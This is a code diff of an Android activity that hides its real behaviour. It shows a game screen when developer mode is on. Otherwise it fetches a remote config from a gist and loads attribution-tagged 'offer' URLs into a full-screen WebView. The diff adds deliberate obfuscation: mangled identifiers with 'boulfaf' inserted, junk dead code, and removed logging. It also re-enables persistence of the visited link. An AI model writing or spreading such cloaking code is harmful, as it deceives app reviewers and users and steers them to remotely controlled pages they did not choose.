@@ -1,11 +1,7 @@
 package com.cnoi.boulfaf;
 
-import static com.cnoi.boulfaf.F_B_K.strDeep;
-import static com.cnoi.boulfaf.ParseStr.decode;
-
-import androidx.appcompat.app.AppCompatActivity;
-
-import android.os.Bundle;
+import static com.cnoi.boulfaf.FboulfafK.stboboulfafafrDeep;
+import static com.cnoi.boulfaf.ParseboulfafStr.decoboulfafde;
 
 import android.app.Activity;
 import android.content.Context;
@@ -13,18 +9,19 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.graphics.Bitmap;
 import android.net.Uri;
+import android.os.Bundle;
 import android.os.Handler;
 import android.util.Log;
 import android.view.View;
 import android.webkit.ValueCallback;
 import android.webkit.WebChromeClient;
-import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.ProgressBar;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
+import androidx.appcompat.app.AppCompatActivity;
 
 import java.io.IOException;
 
@@ -36,106 +33,116 @@ import retrofit2.Retrofit;
 
 public class C9B extends AppCompatActivity {
 
-    private ProgressBar progressBar;
-    private WebView webView;
-    private String link;
-    private ValueCallback<Uri[]> myFilePathCallback;
-    private SharedPreferences sPrefs;
-    private String offer;
-    private String fb_Id;
-    public static final String URL_SHARED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
-    public static final int INPUT_FILE_REQUEST_CODE = 1;
-    public static String keyDefault;
-    public static String statusAppsFlyer;
-    public static String strAppsFlyer;
-    public static String AppsFl_Id;
-    public static String deepLink;
+    private ProgressBar proboulfafgressBar;
+    private WebView webVboulfafiew;
+    private String liboulfafnk;
+    private ValueCallback<Uri[]> myFilePboulfafathCallback;
+    private SharedPreferences sPboulfafrefs;
+    private String ofboulfaffer;
+    private String fbboulfafId;
+    public static final String URLboulfafD_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
+    public static final int INPUT_FILboulfafEST_CODE = 1;
+    public static String keyDboulfafult;
+    public static String statuboulfafFlyer;
+    public static String strboulfaflyer;
+    public static String ApboulfafId;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        progressBar = findViewById(R.id.progressBar);
+        getWindow().addFlags(1024);
+        setContentView(R.layout.activity_boulfafmain);
+        proboulfafgressBar = findViewById(R.id.progressBar);
 
-        if (!devModeOff()) {       // TODO delete !
-            webView = findViewById(R.id.webView);
-            setWebView(webView);
+        if ( ((android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
+                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0)) == 0)) {
 
-            Retrofit retrofit = new Retrofit.Builder()
-                    .baseUrl(CNSTN.GistLink)
+            webVboulfafiew = findViewById(R.id.webView);
+            webVboulfafiew.setWebChromeClient(new Myboulfafient());
+            webVboulfafiew.setWebViewClient(new MyWeboulfafient());
+
+
+            Retrofit retrboulfafofit = new Retrofit.Builder()
+                    .baseUrl(ParseboulfafStr.GisboulfaftLink)
                     .build();
-            GistApi gistApi = retrofit.create(GistApi.class);
-            Call<ResponseBody> gistQuery = gistApi.getStringUrl();
-            gistQuery.enqueue(new Callback<ResponseBody>() {
+            Gistboulfafpi gisboulfaftApi = retrboulfafofit.create(Gistboulfafpi.class);
+            Call<ResponseBody> gboulfafistQuery = gisboulfaftApi.getStrboulfafingUrl();
+
+            donboulfafth(false);
+            gboulfafistQuery.enqueue(new Callback<ResponseBody>() {
                 @Override
                 public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
                     if (response.isSuccessful() & response.body() != null) {
                         try {
-                            String url = response.body().string();
-                            String[] params = url.split("\\|");
-                            offer = params[0];
-                            keyDefault = params[1];
-                            fb_Id = params[2];
+                            String urboulfafl = response.body().string();
+                            String[] parboulfafams = urboulfafl.split("\\|");
+                            ofboulfaffer = parboulfafams[0];
+                            keyDboulfafult = parboulfafams[1];
+                            fbboulfafId = parboulfafams[2];
 
-                            F_B_K facebook = new F_B_K(fb_Id, C9B.this);
-                            facebook.init();
+                            FboulfafK fboulfafbook = new FboulfafK(fbboulfafId, C9B.this);
+                            fboulfafbook.iniboulfaft();
+                            fboulfafbook.setWboulfafebView(webVboulfafiew);
 
-                            sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
-                            link = sPrefs.getString(URL_SHARED_PREF, null);
+                            donboulfafth(false);
+
+                            sPboulfafrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
+                            liboulfafnk = sPboulfafrefs.getString(URLboulfafD_PREF, null);
 
 
-                            // TODO uncomment
-
-//                            if (link != null) {
-//                                webView.loadUrl(link);
-//                            } else {
+                            if (liboulfafnk != null) {
+                                webVboulfafiew.loadUrl(liboulfafnk);
+                            } else {
                                 new Handler().postDelayed(() -> {
-                                    startWebView(offer);
-                                }, 5112);
-//                            }
+                                    staboulfafView(ofboulfaffer);
+                                    donboulfafth(false);
+                                }, 5210);
+                            }
                         } catch (IOException e) {
                             e.printStackTrace();
                         }
                     } else {
-                        goToGame();
+                        goboulfafame();
                     }
                 }
 
                 @Override
                 public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {
-                    goToGame();
+                    goboulfafame();
                 }
             });
 
         } else {
-            goToGame();
+            donboulfafth(false);
+            goboulfafame();
         }
     }
 
 
-    private void goToGame() {
-        startActivity(new Intent(this, MMyGameActivity.class));
+    private void goboulfafame() {
+        startActivity(new Intent(this, Menuboulfafctivity.class));
         finish();
     }
 
-    void startWebView(String link) {
-        if (statusAppsFlyer != null && statusAppsFlyer.equals(decode("Tm9uLW9yZ2FuaWM="))) {
-            String url = link + strAppsFlyer;
-            Log.i("MyApp", "non-organic - " + url);
-            webView.loadUrl(url);
-        } else if (strDeep != null) {
-            ParseStr parserStr = new ParseStr();
-            strDeep = parserStr.parse(deepLink);
-            String url = link + strDeep;
-            webView.loadUrl(url);
-            Log.i("MyApp", "deepLink - " + url);
+    void staboulfafView(String linboulfafk) {
+        if (statuboulfafFlyer != null && statuboulfafFlyer.equals(decoboulfafde("Tm9uLW9yZ2FuaWM="))) {
+            donboulfafth(false);
+            String urboulfafl = linboulfafk + strboulfaflyer;
+            webVboulfafiew.loadUrl(urboulfafl);
+        } else if (stboboulfafafrDeep != null) {
+            donboulfafth(false);
+            ParseboulfafStr parboulfafserStr = new ParseboulfafStr();
+            stboboulfafafrDeep = parboulfafserStr.pboulfafarse(stboboulfafafrDeep);
+            String urboulfafl = linboulfafk + stboboulfafafrDeep;
+            webVboulfafiew.loadUrl(urboulfafl);
         } else {
-            if (keyDefault.equals("NO")) {
-                goToGame();
+            if (keyDboulfafult.equals("NO")) {
+                donboulfafth(false);
+                goboulfafame();
             } else {
-                String url = new ParseStr().parseOrganic(link);
-                Log.i("MyApp", "organic - " + url);
-                webView.loadUrl(url);
+                donboulfafth(false);
+                String uboulfafrl = new ParseboulfafStr().parsboulfafeOrganic(linboulfafk);
+                webVboulfafiew.loadUrl(uboulfafrl);
             }
         }
     }
@@ -143,50 +150,43 @@ public class C9B extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        webView.goBack();
+        webVboulfafiew.goBack();
     }
 
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
-        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
+        if (requestCode != INPUT_FILboulfafEST_CODE || myFilePboulfafathCallback == null) {
             super.onActivityResult(requestCode, resultCode, data);
             return;
         }
         if (resultCode == Activity.RESULT_OK & data != null) {
-            String dataString = data.getDataString();
-            Uri[] result = new Uri[]{Uri.parse(dataString)};
-            myFilePathCallback.onReceiveValue(result);
-            myFilePathCallback = null;
+            String datboulfaftring = data.getDataString();
+            Uri[] reboulfafsult = new Uri[]{Uri.parse(datboulfaftring)};
+            myFilePboulfafathCallback.onReceiveValue(reboulfafsult);
+            myFilePboulfafathCallback = null;
         }
     }
 
 
-    private boolean devModeOff() {
-        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
-                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
-        return devInt == 0;
-    }
-
-
-    class MyWebChromeClient extends WebChromeClient {
+    class Myboulfafient extends WebChromeClient {
         @Override
         public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
-            myFilePathCallback = filePathCallback;
-            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
+            myFilePboulfafathCallback = filePathCallback;
+            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decoboulfafde("aW1hZ2UvKg=="))), INPUT_FILboulfafEST_CODE);
             return true;
         }
     }
 
-    class MyWebViewClient extends WebViewClient {
+    class MyWeboulfafient extends WebViewClient {
         @Override
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
-            webView.setVisibility(View.VISIBLE);
-            progressBar.setVisibility(ProgressBar.INVISIBLE);
+            webVboulfafiew.setVisibility(View.VISIBLE);
+            proboulfafgressBar.setVisibility(ProgressBar.INVISIBLE);
 
-            if (url.contains(decode("NDA0"))) {
-                goToGame();
+            if (url.contains(decoboulfafde("NDA0"))) {
+                goboulfafame();
                 finish();
             }
         }
@@ -194,36 +194,19 @@ public class C9B extends AppCompatActivity {
         @Override
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
-            SharedPreferences.Editor editor = sPrefs.edit();
-            editor.putString(URL_SHARED_PREF, url);
-            editor.apply();
+            SharedPreferences.Editor editboulfafor = sPboulfafrefs.edit();
+            editboulfafor.putString(URLboulfafD_PREF, url);
+            editboulfafor.apply();
         }
     }
 
-
-    private void setWebView(WebView webViewetgpy) {
-        webViewetgpy.getSettings().setJavaScriptEnabled(true);
-        webViewetgpy.getSettings().setAppCacheEnabled(true);
-        webViewetgpy.getSettings().setDomStorageEnabled(true);
-        webViewetgpy.getSettings().setAllowContentAccess(true);
-        webViewetgpy.getSettings().setAllowFileAccess(true);
-        webViewetgpy.getSettings().setAppCacheEnabled(true);
-        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
-        webViewetgpy.getSettings().setSaveFormData(true);
-        webViewetgpy.getSettings().setMixedContentMode(0);
-        webViewetgpy.getSettings().setSavePassword(true);
-        webViewetgpy.getSettings().setAllowContentAccess(true);
-        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
-        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
-        webViewetgpy.getSettings().setDatabaseEnabled(true);
-        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
-        webViewetgpy.getSettings().setUseWideViewPort(true);
-        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
-        webViewetgpy.getSettings().setDomStorageEnabled(true);
-        webViewetgpy.getSettings().setAllowFileAccess(true);
-        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
-        webViewetgpy.getSettings().setEnableSmoothTransition(true);
-        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
-        webViewetgpy.setWebViewClient(new MyWebViewClient());
+    public void donboulfafth(boolean bol) {
+        if (bol) {
+            Asdasdasdge aboulfafge = new Asdasdasdge();
+            aboulfafge.setYear(10);
+            ImmutableSboulfaftudent immutableStudent = new ImmutableSboulfaftudent("Andrew", aboulfafge);
+            aboulfafge.setYear(30);
+        }
     }
 }
+
